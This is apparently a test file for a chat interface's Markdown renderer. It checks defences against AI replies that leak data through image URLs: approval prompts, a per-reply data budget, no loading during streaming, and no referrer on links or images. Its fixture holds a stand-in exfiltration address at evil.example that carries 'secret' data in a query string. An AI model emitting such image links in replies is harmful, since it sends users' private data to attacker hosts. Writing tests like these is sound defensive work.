import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";

import { installDom } from "@/test/dom";
import { IMAGE_BIT_FLOOR, REPLY_BIT_BUDGET } from "@/lib/imageAddressBits";
import { heavyImageAddress } from "@/lib/imageBudget.fixture";
import { IMAGE_PROMPT_COPY } from "@/lib/imageUrlFilter";
import { ImageBudgetScope } from "./image-budget";
import { MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function show(root: Root, text: string, host: HTMLElement, isRunning = false, messageId?: string) {
  const deadline = Date.now() + 3000;
  await act(async () =>
    root.render(
      <ImageBudgetScope messageId={messageId}>
        <TextMessagePartProvider text={text} isRunning={isRunning}>
          <MarkdownText />
        </TextMessagePartProvider>
      </ImageBudgetScope>,
    ),
  );
  // The Markdown primitive reveals new text a few characters per animation frame: wait until the page stops changing.
  let last = "";
  for (let stable = 0; stable < 4 && Date.now() < deadline; ) {
    await act(async () => { await Bun.sleep(20); });
    stable = host.innerHTML === last ? stable + 1 : 0;
    last = host.innerHTML;
  }
}

async function reply(text: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, text, host);
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
const buttonNamed = (host: HTMLElement, name: string) =>
  [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;
const IMAGE_ADDRESS = (tail: string) => `https://evil.example/p.png?d=${"secret".repeat(14)}${tail}`;

test("a reply's normal image loads without asking", async () => {
  const host = await reply("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("an image address that carries data shows the host and full address, with no img until Load", async () => {
  const host = await reply(`![chart](${carrier})`);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.why("evil.example"));
  expect(host.textContent).toContain(carrier);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(carrier);
});

test("Not now leaves the image's description and no img", async () => {
  const host = await reply(`![chart](${carrier})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("chart"));
});

test("a data: image never loads and never asks", async () => {
  const host = await reply("![dot](data:image/png;base64,iVBORw0KGgo=)");
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
});

test("a link in a reply sends no referrer and no opener", async () => {
  const host = await reply("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("href")).toBe("https://example.com/docs");
  expect(link.getAttribute("rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});

test("an image that loads sends no referrer", async () => {
  const host = await reply(`![chart](https://i.imgur.com/AbCd123.png)\n\n![big](${carrier})`);
  expect(host.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("referrerpolicy"))).toEqual(["no-referrer", "no-referrer"]);
});

test("Load approves the address the reader saw: if the address changes under the same image, it asks again", async () => {
  const a = IMAGE_ADDRESS("A");
  const b = IMAGE_ADDRESS("B");
  const host = await reply(`![chart](${a})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(a);
  await show(mounted!, `![chart](${b})`, host);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(b);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(b);
});

// Addresses with a lot of room for data (about 1,150 bits each): three fit in a reply's budget, a fourth does not.
const photo = (host: string, name = "p") => `![${name}](${heavyImageAddress(host, name)})`;
const imageCount = (host: HTMLElement) => host.querySelectorAll("img").length;

test("ordinary images never wait: five from other hosts all load, and nothing asks", async () => {
  const host = await reply(["a", "b", "c", "d", "e"].map((h) => `![${h}](https://${h}.example/photos/2026/front-page-${h}.png)`).join("\n\n"));
  expect(imageCount(host)).toBe(5);
  expect(host.querySelector("button")).toBeNull();
});

test("a reply whose images have more room for data than its budget: three load, the rest wait for one prompt for the whole reply", async () => {
  const host = await reply(["a.example", "b.example", "c.example", "d.example", "e.example"].map((h) => photo(h)).join("\n\n"));
  expect(imageCount(host)).toBe(3);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["d.example", "e.example"]));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.why);
  expect(host.querySelectorAll("button").length).toBe(2); // one prompt: Load and Not now
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(5);
  expect(host.querySelector("button")).toBeNull();
});

test("Not now on the reply's prompt leaves the held images as descriptions and asks no more", async () => {
  const host = await reply(["a", "b", "c", "d", "e"].map((h) => photo(`${h}.example`)).join("\n\n"));
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(imageCount(host)).toBe(3);
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
});

test("our own hosts are charged only the floor: four of them leave room for three heavy images", async () => {
  const own = [1, 2, 3, 4].map((n) => photo("node.tinycloud.xyz", `n${n}`)).join("\n\n");
  const host = await reply(`${own}\n\n${photo("a.example")}\n\n${photo("b.example")}\n\n${photo("c.example")}`);
  expect(imageCount(host)).toBe(7);
  expect(host.querySelector("button")).toBeNull();
});

test("an approval covers the addresses it named: an image added to the reply afterwards waits again", async () => {
  const five = ["a", "b", "c", "d", "e"].map((h) => photo(`${h}.example`)).join("\n\n");
  const host = await reply(five);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(5);
  await show(mounted!, `${five}\n\n${photo("f.example")}`, host);
  expect(imageCount(host)).toBe(5);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["f.example"]));
});

const srcs = (host: HTMLElement) => [...host.querySelectorAll("img")].map((img) => img.getAttribute("src"));

test("while a reply streams, no image loads, not even one of ours; the silent three are chosen from the finished text, in document order", async () => {
  const text = [
    "![a][r]",
    photo("b.example", "b"),
    photo("c.example", "c"),
    photo("d.example", "d"),
    photo("node.tinycloud.xyz", "own"),
    `[r]: ${heavyImageAddress("r.example", "real")}`,
  ].join("\n\n");
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);

  // A reference definition arriving character by character: every prefix that parses as an address is a different image.
  for (const prefix of [text.slice(0, text.indexOf("[r]:") + 14), text.slice(0, text.indexOf("[r]:") + 21), text]) {
    await show(mounted, prefix, host, true);
    expect(srcs(host)).toEqual([]);
    expect(host.textContent).not.toContain("more image");
  }

  await show(mounted, text, host, false);
  // The reference definition is revealed last and draws nothing itself, so the page looks settled before the reveal ends.
  for (let waited = 0; srcs(host).length < 4 && waited < 3000; waited += 20) await act(async () => { await Bun.sleep(20); });
  const settled = srcs(host);
  expect(settled).toEqual([heavyImageAddress("r.example", "real"), heavyImageAddress("b.example", "b"), heavyImageAddress("c.example", "c"), heavyImageAddress("node.tinycloud.xyz", "own")]);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["d.example"]));

  // Reopening the reply decides the same three, whatever happened while it streamed.
  act(() => mounted!.unmount());
  host.remove();
  const reopened = document.createElement("div");
  document.body.append(reopened);
  mounted = createRoot(reopened);
  await show(mounted, text, reopened, false);
  expect(srcs(reopened)).toEqual(settled);
  expect(reopened.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["d.example"]));
});

test("an address that asks shows no prompt for half a reply: it waits until the text is final", async () => {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, `![chart](${carrier})`, host, true);
  expect(host.querySelector("button")).toBeNull();
  expect(host.querySelector("img")).toBeNull();
  await show(mounted, `![chart](${carrier})`, host, false);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
});

// Every address an <img> ever had, not only the final page: a transient load is a request.
function recordSrcs() {
  const ever: string[] = [];
  const original = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
    if (this.tagName === "IMG" && name === "src") ever.push(value);
    return original.call(this, name, value);
  };
  return { ever, stop: () => { Element.prototype.setAttribute = original; } };
}

async function mountRecorded() {
  restore = installDom();
  const recorder = recordSrcs();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  const stop = restore;
  restore = () => { recorder.stop(); stop(); };
  return { host, ever: recorder.ever };
}

const row = (...names: string[]) => names.map((n) => photo(`${n}.example`, n)).join("\n\n");
const loaded = (...names: string[]) => names.map((n) => heavyImageAddress(`${n}.example`, n));

test("a finished reply loads its first three images and no other address is ever requested, not even once", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded("a", "b", "c")));
});

// Security review v7, F2: an image that loads before the reply ends is a request the budget never counted.
test("images on an allowlisted host are counted too: none is requested while the reply streams, and no more than the budget allows after it", async () => {
  const { host, ever } = await mountRecorded();
  const allowed = REPLY_BIT_BUDGET / IMAGE_BIT_FLOOR;
  const text = Array.from({ length: allowed + 12 }, (_, i) => `![i](https://i.imgur.com/Zq${i.toString(36).padStart(5, "0")}.png)`).join("\n");
  await show(mounted!, text, host, true);
  expect(ever).toEqual([]);
  await show(mounted!, text, host, false);
  for (let waited = 0; srcs(host).length < allowed && waited < 8000; waited += 50) await act(async () => { await Bun.sleep(50); });
  expect(srcs(host)).toHaveLength(allowed);
  expect(new Set(ever).size).toBe(allowed);
});

test("an address changed in place while the reply is finished keeps its place: no held image takes it", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false);
  await show(mounted!, row("x", "b", "c", "d", "e"), host, false);
  await show(mounted!, row("y", "b", "c", "d", "e"), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded("a", "b", "c", "x", "y")));
  expect(srcs(host)).toEqual(loaded("y", "b", "c"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["d.example", "e.example"]));
});

test("images that go away give up what they were charged: no prompt is left for an image that is no longer there", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false);
  expect(host.textContent).toContain("more images");
  await show(mounted!, row("e"), host, false);
  expect(srcs(host)).toEqual(loaded("e"));
  expect(host.textContent).not.toContain("more image");
  expect(host.querySelector("button")).toBeNull();
});

test("another message in the same component starts with a fresh budget: an approval does not carry over", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false, "message-1");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(srcs(host)).toEqual(loaded("a", "b", "c", "d", "e"));
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false, "message-1");
  expect(srcs(host)).toEqual(loaded("a", "b", "c", "d", "e"));
  await show(mounted!, row("a", "b", "c", "d", "e"), host, false, "message-2");
  expect(srcs(host)).toEqual(loaded("a", "b", "c"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["d.example", "e.example"]));
});

test("a Load on an asking address belongs to its message: the same address in another message asks again", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, `![chart](${carrier})`, host, false, "message-1");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(srcs(host)).toEqual([carrier]);
  await show(mounted!, `![chart](${carrier})`, host, false, "message-2");
  expect(host.querySelector("img")).toBeNull(); // the Load was for message-1's image
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
});
